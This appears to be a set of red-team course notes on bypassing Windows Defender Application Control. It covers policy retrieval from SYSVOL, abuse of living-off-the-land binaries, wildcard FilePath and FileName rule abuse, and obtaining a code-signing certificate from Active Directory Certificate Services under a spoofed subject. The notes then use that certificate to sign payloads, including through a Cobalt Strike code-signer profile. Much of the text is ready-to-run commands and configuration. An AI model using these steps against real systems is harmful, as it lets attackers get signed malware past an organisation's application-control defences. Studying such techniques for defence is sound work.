
Microsoft recognises WDAC as an [official security boundary](https://www.microsoft.com/en-us/msrc/windows-security-servicing-criteria), which means that it's substantially more robust and applicable bypasses are actually fixed (and a CVE often issued to the finder).

WDAC policies are first defined in XML format - Microsoft ships several base policies which can be found under `C:\Windows\schemas\CodeIntegrity\ExamplePolicies`.  Multiple policies can be merged into a single policy, which is then packaged into a `.p7b` file and pushed out via GPO (or another management platform such as Intune).

```
ls \\acme.corp\SYSVOL\acme.corp\Policies\{9C02E6CB-854E-4DEF-86AB-3647AE89309F}\Machine\

download \\acme.corp\SYSVOL\acme.corp\Policies\{9C02E6CB-854E-4DEF-86AB-3647AE89309F}\Machine\Registry.pol
```

The GPO policy simply points to the p7b file, which must be downloaded and applied by each machine

```
Parse-PolFile .\Registry.pol
```

This is usually in a world readable location, so it can just be downloaded for offline review:
```
download \\acme.corp\SYSVOL\acme.corp\scripts\CIPolicy.p7b
```

If you already have access to a machine which has the WDAC policy applied, the p7b can be downloaded from `C:\Windows\System32\CodeIntegrity`.

[Matt Graeber](https://twitter.com/mattifestation) wrote a tool called [CIPolicyParser.ps1](https://gist.github.com/mattifestation/92e545bf1ee5b68eeb71d254cec2f78e), which can reverse this binary p7b format back into human-readable XML

```
ipmo C:\Tools\CIPolicyParser.ps1
ConvertTo-CIPolicy -BinaryFilePath .\CIPolicy.p7b -XmlFilePath CIPolicy.xml
```

WDAC allows for very granular control when it comes to trusting an application.  The most commonly used rules include:

- Hash - allows binaries to run based on their hash values.
- FileName - allows binaries to run based on their original filename.
- FilePath - allows binaries to run from specific file path locations.
- Publisher - allows binaries to run that are signed by a particular CA.

Each rule can also have a fallback rule, for example publisher as the primary and filepath as the fallback. That way an application could run if it was in the correct location even if the signer check failed. 

## Living of the land binaries, scripts and libraries

As is the case with AppLocker, there are many windows binaries and scripts that can be used to execute arbitrary code and bypass WDAC. These bypass a typical WDAC policy because signed windows applications are trusted by default. Microsoft actively maintains a recommended [blocklist](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/applications-that-can-bypass-appcontrol) to combat these. These explicit deny rules are easy to pick out in the XML.

These are FileName rules, so they look at the filename an application was originally compiled with. These are baked into the application themselves and can be seen in their properties. 

Attempting to execute any blocked application will be prevented, the way to leverage a trusted windows binary, script or library is to find one that isn't being blocked by the policy. The [Ultimate WDAC Bypass List](https://github.com/bohops/UltimateWDACBypassList), is a great resource to cross-reference with

## Wildcard FilePaths

The most robust type of WDAC rule is based on publisher (code signing) certificates, however not all developers sign their applications. 7-zip is a popular windows tool, but none of their files are signed. 

The next best way to whitelist these may be with the individual FilePath rules for each file and Hash fallbacks. The absolute lazy way would be to just whitelist the entire directory. Such a rule looks like this:

```
<File Rules>
 <Allow ID="ID_ALLOW_A_0001" FilePath="C:\Program Files\7-zip\*" />
 <Allow ID="ID_ALLOW_A_0002" FileName="7zipInstall.exe" MinimumFileVersion="22.1.0.0" />
</FileRules>
```

All we have to do to abuse this rule is copy a binary into the directory:

```
cd C:\Users\lmoore\Desktop
ConsoleApp.exe
copy ConsoleApp.exe "C:\Program Files\7-zip"
"C:\Program Files\7-zip\ConsoleApp.exe"
```

Be careful about the FilePath rules called Runtime FilePath Rule Protection. This is enabled by default and what it does is check the DACL of the path at runtime. If the path is writeable by any non-administrative users, then WDAC will block execution despite the fact the path is allowed in the policy. So in this example if there was a DACL misconfiguration on C:\Program Files\7-zip that allowed standard users to drop executables there, then WDAC would just block everything in the entire directory. 

## FileName

The other rule present from the 7-zip example is for its installer:

```
<File Rules>
 <Allow ID="ID_ALLOW_A_0001" FilePath="C:\Program Files\7-zip\*" />
 <Allow ID="ID_ALLOW_A_0002" FileName="7zipInstall.exe" MinimumFileVersion="22.1.0.0" />
</FileRules>
```
This is a simple FileName rule that was generated from the installer EXE

It requires that the application is compiled with the name "7zipInstall.exe" and the file version is at least 22.1.0.0. These rules are incredibly fragile because we can compile binaries with arbitrary file names and version numbers. For example, in a .NET project go into the project properties and set the assembly name. Then click on Assembly information and set the File version. 

The compiled assembly will then have the properties required to be allowed by this rule and it will execute. 

## Trusted Signers

Some organisations build and maintain their own custom [LOB](https://en.wikipedia.org/wiki/Line_of_business) applications which may be signed using an internal certificate authority, such as Active Directory Certificate Services.  Those CAs can be trusted by their WDAC policy in order for them to run their own apps.

WDAC has two levels of certificate policy (three if you count `Root`, but that's not supported).  The first is `Leaf` and the second is `PCA` (short for Private Certificate Authority).  Leaf adds trusted signers at the individual signing certificate level and PCA adds the highest certificate available in the chain (typically one certificate below the root certificate).

List the code signature:

```
Get-AuthenticodeSignature -FilePath 'C:\Program Files\ACME Corp\Helloworld.exe'
```

The relevant WDAC policy can be harder to find because they tend to lose their friendly names. All we see is a signer entry and a TBS hash of the certificate. 

```
<Signer Name="Signer 33" ID="ID_SIGNER_S_0021">
 <CertRoot Type="TBS" Value="FDF695C092757A619ADS18882618818635ASDFA8163A5D2SF18631A0" />
</Signer>
```

TBS or "ToBeSigned" is calculated from the SignerCertificate details of a signed binary. To circumvent this rule we need to obtain the certificate that the policy was generated with, or request our own certificate from the same code signing template.

We can enumerate all the templates on the CA, search for any that are for code signing and check their enrollment rights:

```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /ca:sub-ca.acme.corp\sub-ca
```

If you have desktop access to a domain-joined machine, a certificate can be requested directly through the Certificates snap-in in MMC and then exported in PFX format. ENROLLEE_SUPPLIES_SUBJECT is enabled on the template which allows us to provide an arbitrary subject for the certificate.  If we want to replicate the signed HelloWorld binary, just enter "CN=ACME Corp". 

If you only have command-line access, then the native `certreq` and `certutil` tools can be used instead.

1. First create an .inf file with the following content:
```
[NewRequest]
Subject = "CN=ACME Corp"

KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
SMIME = False
PrivateKeyArchive = FALSE
UserProtected = FALSE
UseExistingKeySet = FALSE
ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
ProviderType = 12
RequestType = PKCS10
KeyUsage = 0xa0
HashAlgorithm = SHA256

[RequestAttributes]
CertificateTemplate=RTOCodeSigning

[EnhancedKeyUsageExtension]
OID=1.3.6.1.5.5.7.3.3
```
2. The important aspects to note is the Subject field, CertificateTemplate and OID.  Next, convert this file into binary CSR format. `certreq -new -config sub-ca.acme.corp\sub-ca acme.inf acme.csr`
3. The CSR can then be submitted to the CA. `certreq -submit -config sub-ca.acme.corp\sub-ca acme.csr cert.cer`
4. The provided certificate does not include the private key, so we have to install the certificate and then re-export it with the private key. `certreq -accept cert.cer`
5. List the certificates in the user's personal store to get the ID of the cert that we just imported. `certutil -user -store My`
6. In this case, there is only one, so the ID is 0.  Export it with the private key and a password. `certutil -user -exportpfx -privatekey -p pass123 My 0 acme.pfx`
7. The exported PFX then needs to be downloaded to the attacker's machine where it can be used to sign binaries.  The `signtool` utility can be used for this (which comes with the Windows SDK) and is best run from a Visual Studio Developer prompt. `signtool sign /f acme.pfx /p pass123 /fd SHA256 C:\Payloads\https_x64.exe`
8. The signed binary will run on Workstation 3.

### Signing with cobalt strike

Cobalt also has a code-signing workflow which allows you to automatically sign executable payloads at the time they are generated. 
1. Because it's a java app, we have to create an appropriate java keystore with the keytool utility. This will create a new keystore and private key. `keytool -genkey -alias server -keyalg RSA -keysize 2048 -storetype jks -keystore keystore.jks -dname "CN=ACME Corp"`
2. Generate a CSR from this keystore `keytool -certreq -alias server -file req.csr -keystore keystore.jks`
3. This then needs to be submitted to the ADCS service.  If it's enabled, a nice way to do this is via the CertSrv web UI. At www.domain.com/certsrv/
4. Select _Request a certificate > advanced certificate request_.  Paste the CSR into the text box and select the correct certificate template.
5. Click Submit and then download the certificate chain, which will be in p7b format.
6. transfer this across to the team server and import it into the keystore `keytool -import -trustcacerts -alias server -file certnew.p7b -keystore keystore.jks`
7. The final step is to add a new `code-signer` block to the malleable C2 profile.  This is similar to how we provided the HTTPS keystore previously
```
code-signer {
    set keystore "keystore.jks";
    set password "pass123";
    set alias "server";
}
```

8. Restart the team server and go to _Payloads > Windows Stageless Generate All Payloads_.  Tick the "sign" checkbox and all your executable payloads will be signed.